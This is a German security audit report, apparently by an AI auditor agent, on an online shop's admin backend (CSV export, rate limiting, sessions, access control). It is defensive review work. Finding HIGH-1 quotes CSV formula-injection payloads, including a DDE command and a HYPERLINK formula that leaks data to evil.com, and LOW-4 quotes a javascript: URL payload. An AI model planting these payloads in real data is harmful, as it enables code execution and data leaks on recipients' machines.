# Security-Audit — Hagi Shop Stage 4 (Admin-Backend)

**Datum:** 2026-06-16
**Scope:** Stage-4 Files (Admin-Auth, Order-Management, Manuelle Orders, CSV-Export, Audit-Viewer)
**Auditor:** Security-Auditor Agent (V3) — brutal-honest mode

---

## 1. Executive Summary

**Gesamturteil:** Stage 4 ist **konzeptionell sehr stark** — argon2id, gehashte Session-Tokens, Rate-Limiting, Account-Lock, Server-Action-CSRF, Zod überall, getrennte Admin-Tabelle, Audit-Logging. Das ist deutlich über dem Niveau, das die meisten Solo-Devs erreichen.

**Vor Live nicht blockierend:** Keine Critical, kein Auth-Bypass, kein offener XSS, kein PII-Leak an Public.

**Aber:** Es gibt **3 High-Findings**, die vor Production-Use zwingend gefixt werden müssen — vor allem die **CSV-Formel-Injection** (Excel-Makros), das **Rate-Limit über Audit-Log-Tabelle** (Performance-DoS) und der **Layout-Auth-Anti-Pattern** (Kosmetik, aber wichtig).

Daneben 6 Medium-Findings (PII in Logs, Session-Idle-Timeout, fehlende Length-Limits, etc.) und 4 Low-Findings.

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 3 |
| Medium | 6 |
| Low | 4 |
| Info | 3 |

**3 zwingende Pre-Live-Fixes:** CSV-Formel-Injection · Rate-Limit-Architektur · Layout-Pattern dokumentieren.

---

## 2. Findings nach Severity

### HIGH-1 · CSV-Formel-Injection (CWE-1236) — `lib/services/csv-export.ts`

**Status:** **VERWUNDBAR.**

Die `csvEscape()`-Funktion quoted nur Werte mit `;`, `"`, `\n`, `\r`. Sie verhindert **nicht**, dass eine Zelle mit `=`, `+`, `-`, `@`, `\t`, `\r` beginnt — und genau das ist der Excel/LibreOffice/Google-Sheets-Angriff.

**Angriff:** Ein Angreifer registriert sich mit Namen `=cmd|'/c calc.exe'!A0` oder `=HYPERLINK("https://evil.com/?leak="&A2,"klick")`. Steuerberater öffnet die CSV in Excel → Formel wird ausgeführt → potenziell RCE auf Buchhalter-PC oder Datenleak.

**Betroffene Felder (alle aus User-Input):** `billingFirstName`, `billingLastName`, `billingCompany`, `billingCity`, `customerEmail`, `vatIdSnapshot`.

**Fix:**
```ts
function csvEscape(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  let s = String(value);
  // OWASP CSV-Injection: Zellen die mit Formel-Trigger starten neutralisieren
  if (/^[=+\-@\t\r]/.test(s)) {
    s = "'" + s;
  }
  if (/[;"\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
```

**Severity:** High — Steuerberater ist der einzige andere Mensch der die CSV bekommt; trotzdem ist das ein klassischer Supply-Chain-Vektor (E-Commerce-Shop → Buchhalter-PC → ggf. Mandantennetzwerk).

---

### HIGH-2 · Rate-Limiter sitzt auf AuditLog-Tabelle — `lib/services/rate-limit.ts`

**Status:** **Architektur-Problem.**

Der Rate-Limiter schreibt für jeden Request einen `rate.hit`-Eintrag in die `auditLog`-Tabelle und zählt diese. Mehrere Probleme:

1. **DoS-Verstärker:** Jede Login-Anfrage = 1 INSERT. Wenn jemand 10k Login-Versuche/min schickt, schwellen die `rate.hit`-Rows auf. Die DB wird der Bottleneck, nicht der Angreifer.
2. **Audit-Bloat:** Die `audit.page.tsx` filtert `rate.hit` zwar standardmässig aus (Filter `NOT: { action: "rate.hit" }`) — aber **die zweite Query** (`actionsTop` groupBy) ist über alle Rows, was bei viel Last lahm wird. Ausserdem sind ALL counts inkl. rate.hit; die Audit-Anzeige bleibt clean, aber die DB-Stats nicht.
3. **Cleanup nur "via Cron-Job"** — der Cron ist nicht installiert. Ich finde keinen Aufruf von `cleanupRateLimitLogs()` in der Codebase. → Rows wachsen monoton.
4. **TOCTOU-Race:** `count(...)` und `create(...)` sind nicht atomar. Zwei parallele Requests sehen beide `count < limit` und commiten beide. Bei `limit=5` können also 6–7 durchrutschen. Nicht critical für Login (Account-Lock greift parallel), aber unsauber.

**Fix-Empfehlung (vor Live):**
- Eigene Tabelle `RateLimitBucket(key, windowStart, count)` mit Unique-Index `(key, windowStart)` + `UPSERT` (atomisch increment).
- ODER: Upstash Redis (production-ready, gratis bis 10k req/day).
- ODER: Mindestens den Cleanup-Cronjob jetzt scheduling. Vercel/Coolify Cron auf `cleanupRateLimitLogs()` alle 15min.

**Severity:** High — kein Sicherheitsleck per se, aber **Verfügbarkeit/DoS** Risiko + Tech-Debt der vor Skalierung beisst.

---

### HIGH-3 · Auth-Bypass-Risiko durch Layout-Pattern (Defense-in-Depth) — `app/admin/layout.tsx`

**Status:** **Aktuell sicher, aber gefährliches Pattern.**

Das Layout enforced **keine** Auth. Es zeigt nur Chrome an, wenn `getCurrentAdmin()` einen Admin liefert, sonst zeigt es nur `children`. Jede Page ruft `requireAdmin()` selbst.

**Risiko:** Wenn ein zukünftiger Dev eine neue `app/admin/foo/page.tsx` baut und **vergisst** `await requireAdmin()` aufzurufen, dann ist diese Route **öffentlich erreichbar**. Das Layout fängt das nicht ab.

**Beweis:** `app/admin/login/page.tsx` ist genau das Beispiel: Layout zeigt kein Chrome, Page ruft auch nicht requireAdmin. Wenn jemand `/admin/foo` baut und `requireAdmin` vergisst, sieht die Page einfach so aus wie die Login-Page — ohne Chrome — und ist öffentlich.

**Aktuell ist alles ok:**
- `/admin/page.tsx` → `requireAdmin()` line 23 ✓
- `/admin/bestellungen/page.tsx` → `requireAdmin()` line 45 ✓
- `/admin/bestellungen/[id]/page.tsx` → `requireAdmin()` line 39 ✓
- `/admin/bestellung-anlegen/page.tsx` → `requireAdmin()` line 8 ✓
- `/admin/audit/page.tsx` → `requireAdmin()` line 28 ✓
- `/admin/export/page.tsx` → `requireAdmin()` line 6 ✓
- `/api/admin/export-orders/route.ts` → `requireAdmin()` line 18 ✓

**Fix (Defense-in-Depth):**
- Option A: Middleware `middleware.ts` matcht `/admin/:path*` (ausser `/admin/login`) und ruft `getCurrentAdmin()`, redirect bei null.
- Option B: Layout ruft `requireAdmin()` und Login-Page wird auf `/login` oder `/anmelden` ausserhalb von `/admin` gelegt.
- Option C: ESLint-Custom-Rule die einen Build-Error wirft, wenn eine Page unter `/admin/**` nicht `requireAdmin()` importiert.

**Empfehlung:** Option A. Die Middleware ist 8 Zeilen Code und macht den Layer wasserdicht. Page-level requireAdmin bleibt als Belt-and-suspenders.

**Severity:** High — kein konkreter Bypass aktuell, aber das Pattern ist **eine vergessene Zeile vom Disaster entfernt**.

---

### MEDIUM-1 · IP-Adressen sichtbar für jeden Admin (DSGVO) — `app/admin/audit/page.tsx`

Die Audit-Tabelle zeigt rohe IP-Adressen in der UI (line 148-150). IPs sind nach DSGVO Art. 4 personenbezogene Daten. Bei einem Single-Admin-Setup (Hagi selbst) ist das ok, aber:

- Sobald **mehrere Admins** existieren, sieht jeder die IPs der anderen → DSGVO-Issue (Mitarbeiter-IPs unter Mitarbeitern teilen).
- Customer-IPs werden geloggt (z.B. bei Cart-Actions, Order-Erstellung) — Aufbewahrungsdauer? Ich finde keine Auto-Purge.

**Fix:**
- IP-Hash statt Klartext nach 30 Tagen (oder einfach Pseudonymisierung).
- Oder Anzeige nur als `192.168.x.x` (last 2 octets maskiert) für Customer-Logs.
- Auto-Delete-Job für AuditLog-Rows älter als 6/12 Monate (DSGVO: Speicherbegrenzung).

**Severity:** Medium — wird zum Problem wenn (a) zweiter Admin onboarded oder (b) DSGVO-Auskunftsanfrage kommt.

---

### MEDIUM-2 · Kein Session-Idle-Timeout — `lib/services/admin-auth.ts`

Session läuft **12h absolut** ab Login (line 11: `SESSION_TTL_HOURS = 12`). Es gibt keinen Idle-Timeout (z.B. "nach 60min ohne Activity ausloggen").

**Risiko:** Admin meldet sich morgens an, lässt Laptop offen, geht zum Showroom. 11h später ist das Session-Cookie noch gültig. Jeder mit physischem Zugang kann die Session übernehmen.

**Fix:** `AdminSession` bekommt `lastActivityAt`-Feld. In `getCurrentAdmin()` prüfen: `if (Date.now() - lastActivityAt > 60 * 60 * 1000) revoke session`. Und bei jedem `requireAdmin()`-Call das Feld updaten (asynchron, fire-and-forget).

**Alternativ einfacher:** SESSION_TTL auf 4h reduzieren. Das ist die "ich bin halt eingeloggt während ich arbeite"-Spanne und zwingt zum Re-Login wenn der Laptop liegt.

**Severity:** Medium — physische Angriffe sind selten, aber 12h sind unnötig lang.

---

### MEDIUM-3 · Internal-Note erlaubt 2000 Zeichen plaintext + wird im Admin-UI gerendert — `app/admin/bestellungen/[id]/page.tsx` line 258

Das `whitespace-pre-wrap` rendert die Note. React escaped HTML automatisch, also kein XSS direkt. Aber:

- Note geht in Manual-Order in `internalNote: \`Showroom-Verkauf durch ${admin.email}\${input.internalNote ? \`\n${input.internalNote}\` : ""}\`` — `admin.email` ist trusted, `input.internalNote` ist trusted (von Admin), also ok.
- ABER: `adminUpdateInternalNote` Action akzeptiert 2000 Zeichen. Das könnte ein Vector für **Log-Injection** sein (Newlines im Note → Audit-Trail confusion). Aktuell wird die Note nicht in den Audit-Log geschrieben (gut), aber Defense-in-Depth: Strip `\r`, normalize `\n` → max 5 Zeilen.

**Severity:** Medium-low — kein direkter Exploit, aber unsauber.

---

### MEDIUM-4 · `adminUpdateInternalNote` hat **keinen Audit-Log-Eintrag** — `app/actions/admin-orders.ts` line 110-121

```ts
export async function adminUpdateInternalNote(rawInput: unknown): Promise<ActionResult> {
  // ... requireAdmin + prisma.order.update
  // KEIN logAudit
}
```

Jede andere Admin-Action loggt. Notizen sind oft sensibel (z.B. "Kunde wirkt verdächtig", "Erstattung versprochen"). Das muss revisionssicher sein.

**Fix:** `logAudit({ actorType: "admin", actorId, action: "order.note_updated", before: { previousNote }, after: { newNote: parsed.data.note.slice(0,100) }, ... })`. Vor dem Update den alten Wert lesen.

**Severity:** Medium — DSGVO + Buchhaltungs-Compliance erwartet Trail bei jeder Datenänderung.

---

### MEDIUM-5 · `redirect()` nach Login wird vom Client gemacht, nicht vom Server — `app/actions/admin-auth.ts` + `app/admin/login/page.tsx`

```ts
// Server Action:
return { ok: true, redirectTo: "/admin" };

// Client Page:
if (result.ok) {
  router.push(result.redirectTo);  // <-- Client-side redirect
  router.refresh();
}
```

Das Cookie wird vom Server gesetzt (gut), aber der Redirect läuft client-seitig über JS. Wenn JS deaktiviert ist (selten, aber möglich) oder ein Race auftritt (selten), bleibt der User auf `/admin/login` hängen.

**Wichtiger Punkt:** Da der Login-Cookie schon vom Server-Action gesetzt wird, ist ein zukünftiger Request authentifiziert — also kein Sicherheitsproblem. Aber UX/Robustheit-Issue.

**Fix:** Server-side `redirect("/admin")` nach erfolgreichem Login direkt im Server-Action. Aktuell wird das vermieden weil der Client erst den Error-Case rendern soll. Alternative: bei Erfolg `redirect("/admin")` aufrufen (wirft `NEXT_REDIRECT` Exception, die Next.js auswertet).

**Severity:** Medium — eher Robustheit als Security.

---

### MEDIUM-6 · `ManualOrder` Race-Window: Unique-Produkt kann doppelt verkauft werden — `app/actions/admin-manual-order.ts`

```ts
const product = await prisma.product.findUnique({ where: { id: input.productId }, ... });
if (!product || !product.inStock) return { ok: false, error: "PRODUCT_UNAVAILABLE" };
if (product.isUnique && input.quantity > 1) return { ok: false, ... };

// ... Order wird erstellt in $transaction
// AUSSERHALB der transaction:
if (product.isUnique) {
  await prisma.product.update({ where: { id: product.id }, data: { inStock: false } });
}
```

**Problem:** Zwischen `findUnique` und `product.update` liegt ein Zeitfenster. Zwei Admins (oder Admin + Online-Bestellung) könnten dasselbe Unikat verkaufen.

**Fix:** `product.update` IN die `$transaction` rein. Und beim Lesen `tx.product.update({ where: { id, inStock: true, isUnique: true }, data: { inStock: false } })` — atomare Lock-on-Read. Wenn `update` 0 Rows trifft → "PRODUCT_UNAVAILABLE" werfen.

```ts
const order = await prisma.$transaction(async (tx) => {
  if (product.isUnique) {
    const lockResult = await tx.product.updateMany({
      where: { id: input.productId, inStock: true, isUnique: true },
      data: { inStock: false },
    });
    if (lockResult.count === 0) throw new Error("PRODUCT_UNAVAILABLE");
  }
  return tx.order.create({ ... });
});
```

**Severity:** Medium — Showroom + Online parallel ist genau das Szenario das Hagi vermeiden will (sonst hätte er den Schalter nicht gebaut).

---

### LOW-1 · Argon2-Parameter sind **OWASP-Minimum**, nicht "modern" — `lib/security/password.ts`

```ts
memoryCost: 19456,  // 19MB
timeCost: 2,
parallelism: 1,
```

Das ist exakt OWASP-2023-Minimum. Heute (2026) ist **64MB memoryCost** das gängige Niveau für Server-Hashes. Login-Performance bleibt unter 200ms.

**Fix:** `memoryCost: 65536, timeCost: 3, parallelism: 4`. Nicht critical — der aktuelle Wert ist nicht "kaputt", nur knapp.

**Severity:** Low.

---

### LOW-2 · Passwort-Strength-Check schwach — `lib/security/password.ts` line 26-33

`isStrongPassword` prüft nur: 12+ Zeichen, lower, upper, digit. Keine Sonderzeichen-Pflicht. Kein Top-1k-Common-Password-Block. Kein Check gegen Email/Username.

**Real Talk:** OWASP 2024 Guidance sagt "länger ist wichtiger als komplex" und "blockiert die top 10k common passwords". `Password1234` würde durch deinen Check kommen.

**Fix:** Mindestens eine Liste von 100 absoluten Top-Passwords blocken (`123456789012`, `Password1234`, `Qwerty123456`, `admin1234567` etc.). Oder die `zxcvbn`-Library nehmen (12KB, sehr gut).

**Severity:** Low (es gibt nur 1 Admin, also kein Brute-Force-Spray; aber sobald Mitarbeiter dazu kommen…)

---

### LOW-3 · Logout läuft als Server-Action `logoutAdminAction` über form-action — `app/admin/layout.tsx` line 64

```tsx
<form action={logoutAdminAction} className="...">
  <button type="submit">Abmelden</button>
</form>
```

Next.js Server-Actions sind per Default CSRF-protected (Origin-Check, opaque IDs). Aber **GET-CSRF auf Logout** ist trotzdem ein klassisches "Annoying-Vector": ein Angreifer kann den Admin per `<img src="/admin/logout">` ausloggen. Hier ist es `POST` über form-action, also safe. Nur als Bestätigung dokumentiert.

**Schau auch:** Server-Action-CSRF in Next.js basiert auf:
1. `Origin`/`Sec-Fetch-Site` Header-Check (Next.js intern).
2. Encrypted Action-IDs (in `.next/build`).

Das ist robust gegen Cross-Origin POST. ✓

**Severity:** Low / Info.

---

### LOW-4 · `app/admin/bestellungen/[id]/page.tsx` rendert User-Input ohne explizite Sanitization — line 71, 101-170

Alle User-Daten (`order.shippingFirstName`, `order.billingCompany`, `order.customerEmail`, etc.) werden direkt im JSX gerendert. React escaped HTML automatisch → kein XSS.

ABER: Das `mailto:` und `href={f.trackingUrl}` (line 240) werden nicht validiert. `trackingUrl` kommt aus Zod-Validation (`.url()` → muss valides URL-Format sein), aber Schema erlaubt `javascript:` würde theoretisch nicht über `.url()` durchgehen (Zod-`.url()` matched URL-Parser; `javascript:` URLs ergeben einen URL aber sind `protocol === "javascript:"`).

**Testing:** Zod `.url()` akzeptiert `javascript:alert(1)` als gültige URL (siehe Zod-Tests + viele Issues). Ergo: trackingUrl könnte `javascript:foo` sein, und der `<a href={f.trackingUrl}>` führt das aus, wenn ein Admin draufklickt.

**Fix:** In `shipSchema`:
```ts
trackingUrl: z.string().url().max(500).refine(
  (u) => /^https?:\/\//i.test(u),
  "MUST_BE_HTTP"
).optional().nullable()
```

**Severity:** Low — Self-XSS, weil Admin auf eine URL klickt, die er selbst eingegeben hat (oder ein anderer Admin). Aber unsauber.

---

### INFO-1 · `deprecated`-Shim ist sauber — `lib/admin-auth.ts`

Die Datei leitet `requireAdminAuth()` → `requireAdmin()` weiter und `checkAdminPassword()` wirft. Sauber. Kein Bypass-Risiko. ✓

### INFO-2 · Cookie-Settings sind korrekt — `lib/services/admin-auth.ts` line 130-136

`httpOnly: true`, `secure: production`, `sameSite: "lax"`, `path: "/"`, expiration matched session-TTL. Vorbildlich. ✓

### INFO-3 · Constant-time bei User-Not-Found ist nicht ganz constant — `lib/services/admin-auth.ts` line 67

```ts
await sleep(150 + Math.random() * 100);
```

Das ist ein Random-Delay 150–250ms. Eine echte Constant-Time-Response würde immer auf z.B. 800ms padden (länger als argon2id-Verify im Worst-Case dauert). Aktuell:
- User existiert nicht → 150–250ms.
- User existiert + falsches Passwort → argon2id-Verify (~50–150ms je nach Server).

Die Verteilung überlappt fast, aber ein statistischer Angreifer mit vielen Requests könnte den Unterschied messen. **In der Praxis irrelevant** weil der Login eh rate-limited ist (5/15min). Notiere ich nur als Info.

---

## 3. OWASP Top 10 Mapping (2021)

| OWASP | Status | Notiz |
|---|---|---|
| A01: Broken Access Control | **Pass (mit Defense-in-Depth Empfehlung)** | requireAdmin() überall, aber Layout enforced nicht — siehe HIGH-3 |
| A02: Cryptographic Failures | **Pass** | argon2id, sha256-Token-Hash, randomBytes(32), httpOnly+secure Cookies |
| A03: Injection (SQL, NoSQL, Cmd) | **Pass** | Prisma parametrisiert; **CSV-Formula-Injection ist HIGH-1** (separate Kategorie) |
| A04: Insecure Design | **Pass** | Account-Lock, Rate-Limit, Audit-Log alle vorhanden |
| A05: Security Misconfiguration | **Pass** | Cookie sicher, robots noindex, X-Robots-Tag auf Export |
| A06: Vulnerable Components | **Out of scope** | npm audit separat |
| A07: Identification & Auth Failures | **Pass mit LOW-1/2** | argon2id ok, aber password-strength schwach + session-timeout 12h |
| A08: Software & Data Integrity Failures | **Pass** | Audit-Log auf allen Actions ausser internalNote (MEDIUM-4) |
| A09: Security Logging Failures | **Mostly Pass** | Audit-Log gut, aber internalNote ungeloggt, rate.hit überladen |
| A10: SSRF | **N/A** | Keine User-supplied URLs für Server-Side-Fetches |

**Plus relevant:**
- **CWE-1236 (Improper Neutralization of Formula Elements in CSV):** **FAIL** → HIGH-1.
- **CWE-352 (CSRF):** Pass (Next.js Server-Actions).
- **CWE-307 (Brute-Force):** Pass (Rate-Limit + Lock).

---

## 4. Was vor Live ZWINGEND

**Diese 3 Fixes vor Production-Deploy:**

1. **HIGH-1 CSV-Formula-Injection.** Code-Fix ist 4 Zeilen. Sofort umsetzbar.
2. **HIGH-2 Rate-Limit-Architektur.** Mindestens `cleanupRateLimitLogs()` als Coolify-Cron einrichten (alle 15 Min). Mittelfristig eigene Tabelle oder Redis.
3. **HIGH-3 Auth-Layer (Defense-in-Depth).** Middleware `middleware.ts` für `/admin/:path*` (ausser `/admin/login`).

**Stark empfohlen, nicht blockierend (innerhalb 7 Tage nach Launch):**

4. **MEDIUM-4 Audit-Log auf `adminUpdateInternalNote`.**
5. **MEDIUM-6 Race-Fix: Unique-Produkt in `$transaction`.**
6. **MEDIUM-2 Session-Idle-Timeout** (oder TTL auf 4h reduzieren).

**Pflege-Items (innerhalb 30 Tage):**

7. **MEDIUM-1 IP-Hashing/Auto-Purge** für Customer-IPs in AuditLog (DSGVO).
8. **LOW-4 `trackingUrl` http(s)-only refine.**
9. **LOW-1 Argon2-Parameter auf 2026-Niveau bumpen.**

---

## 5. Pass/Fail-Tabelle (gegen den Audit-Prompt)

| Prüfpunkt | Status | Notiz |
|---|---|---|
| **1. Password-Hashing** | | |
| argon2id mit ≥19MB / ≥2 timeCost | Pass (LOW-1) | exakt 19MB / 2 — Minimum, nicht optimal |
| Length-Limit gegen DoS (≤256) | Pass | `password.ts` line 11 |
| Strength-Check ausreichend | LOW-2 | nur Format-Regex, kein Common-Password-Block |
| **2. Session-Management** | | |
| Token cryptographic random (≥32 bytes) | Pass | `randomBytes(32)` |
| Cookie httpOnly + secure(prod) + sameSite=lax | Pass | line 130-136 |
| Token gehasht in DB (sha256) | Pass | `hashToken(token)` |
| Session-Expiry 12h | Pass mit MEDIUM-2 | absolut, kein Idle-Timeout |
| Logout revoked DB + löscht Cookie | Pass | line 181-192 |
| Idle-Timeout | **Fail (MEDIUM-2)** | nicht implementiert |
| **3. Brute-Force-Schutz** | | |
| Rate-Limit Login 5/15min | Pass | line 12 |
| Account-Lock nach 5 Fails | Pass | line 13-14, 82-101 |
| Constant-time response | Mostly Pass (INFO-3) | sleep 150–250ms, leichte Lücke |
| Lock-Reset bei Login-Success | Pass | line 112 (failedLoginAttempts: 0) |
| **4. Auth-Bypass** | | |
| Jede Admin-Page ruft requireAdmin | Pass (alle 6 Pages) | aber Anti-Pattern — siehe HIGH-3 |
| Layout enforced Auth | **Fail (HIGH-3)** | Layout zeigt nur Chrome, kein Enforcement |
| API-Routes prüfen Auth | Pass | `/api/admin/export-orders` line 18 |
| Deprecated-Shim sicher | Pass (INFO-1) | leitet auf neues System weiter |
| **5. CSRF** | | |
| Server-Actions per default protected | Pass | Next.js intern (Origin + opaque IDs) |
| Form-Submits direkt auf Server Action | Pass | `<form action={logoutAdminAction}>`, `loginAdminAction({...})` |
| **6. Input-Validation** | | |
| Zod auf allen Server Actions | Pass | jeder Action `safeParse` |
| Length-Limits auf Text-Inputs | Pass | überall `.max(...)` |
| URL-Validation auf trackingUrl | Mostly Pass (LOW-4) | `.url()` aber kein http(s)-only-Check |
| Email-Normalize | Pass | `normalizeEmailOrThrow` |
| **7. Privilege-Escalation** | | |
| Kein isAdmin-Flag, separate Admin-Table | Pass | `prisma.admin` distinct from `customer` |
| Sessions cross-customer/admin trennen | Pass | `adminSession.tokenHash` is separate table |
| Manuelle Order: actor aus Session | Pass | line 38 `const admin = await requireAdmin()` |
| **8. CSV-Injection** | | |
| Keine Zelle startet mit `=+-@` | **Fail (HIGH-1)** | csvEscape filtert nicht für Formel-Trigger |
| Strings mit `;"` escaped | Pass | line 15-18 |
| UTF-8 BOM für Excel | Pass | route.ts line 57 (`"﻿"`) |
| **9. CSV-Export-Security** | | |
| Auth required | Pass | line 18 |
| Rate-Limit | **Fail** | kein Rate-Limit auf Export-Endpoint |
| Max-Range-Check | Pass | 366 Tage max, line 32-36 |
| Audit-Log für Export | Pass | line 45-53 |
| PII nur für Admin | Pass | Auth-Check + `Cache-Control: private, no-store` |
| **10. Audit-Viewer** | | |
| rate.hit ausgefiltert | Pass | line 33-34 + line 54 |
| IPs für nicht-Admin geschützt | Pass (aber MEDIUM-1) | Page hinter requireAdmin, aber alle Admins sehen alle IPs |
| Pagination-Limit | Pass | PAGE_SIZE=50 |
| **11. Order-Actions** | | |
| Server-Action validates orderId | Pass | `.min(1).max(128)` |
| Status-Transitions race-safe | Pass | `order-lifecycle.ts` nutzt $transaction + Where-Conditions |
| Bestätigung-UI vor Cancel/Refund | Pass | `CancelForm` zwingt Grund + Refund-Checkbox |
| **12. Manuelle Order** | | |
| Atomar in $transaction | Mostly Pass (MEDIUM-6) | Order in tx, aber Product-Update danach (Race!) |
| Unique-Lock | **Fail (MEDIUM-6)** | nicht atomar mit Order-Create |
| Customer-Email normalized | Pass | line 56 |
| Audit-Log mit Admin-Identity | Pass | line 154-167 |
| **13. CSP / XSS** | | |
| Tracking-URL Admin-Render | LOW-4 | `<a href={trackingUrl}>` mit `target="_blank" rel="noopener"`, aber `javascript:` nicht refused |
| dangerouslySetInnerHTML | Pass | nicht vorhanden im Scope |
| React-Escape überall | Pass | alle User-Inputs via JSX-Curly |

---

## 6. Schlussbewertung

**Stage 4 ist sicherheitstechnisch ein guter Sprung gegenüber Stage 1–3.** Die Architektur-Entscheidungen sind richtig:
- argon2id statt bcrypt ✓
- DB-Sessions statt JWT ✓
- gehashte Tokens ✓
- separate Admin-Tabelle ✓
- Rate-Limit + Account-Lock kombiniert ✓
- Audit-Log auf fast allem ✓
- Zod überall ✓
- httpOnly/secure/sameSite ✓

**Die Lücken sind nicht "Anfängerfehler" — sie sind die typischen "letzte 10%" die selbst seniorige Devs übersehen:**
- CSV-Formula-Injection (kennen vielleicht 30% der Backend-Devs).
- Layout-Enforcement-Pattern (subtil; nur durch Audits sichtbar).
- Rate-Limit auf Audit-Tabelle (funktioniert, aber wird zur Last).

**Ehrliche Empfehlung an Ilias:** Fix HIGH-1 jetzt (4 Zeilen Code, 5 Minuten). Setup Middleware für HIGH-3 (10 Zeilen Code, 15 Minuten). Coolify-Cron für `cleanupRateLimitLogs` (5 Minuten). Dann bist du **production-ready für einen Solo-Showroom-Shop**.

Die MEDIUM-Findings kannst du in den ersten 4 Wochen nach Launch nacharbeiten — das ist ehrlich, nicht riskant, solange Hagi der einzige Admin bleibt und das Volume klein ist (< 100 Bestellungen/Monat).

**Nicht launchen ohne HIGH-1-Fix.** Das ist der einzige der "im Wild" ausgenutzt werden kann (Customer registriert sich mit Formel-Name → Steuerberater öffnet CSV → Eskalation).

---

**Auditor-Signature:** security-auditor-v3 · ReasoningBank · 2026-06-16
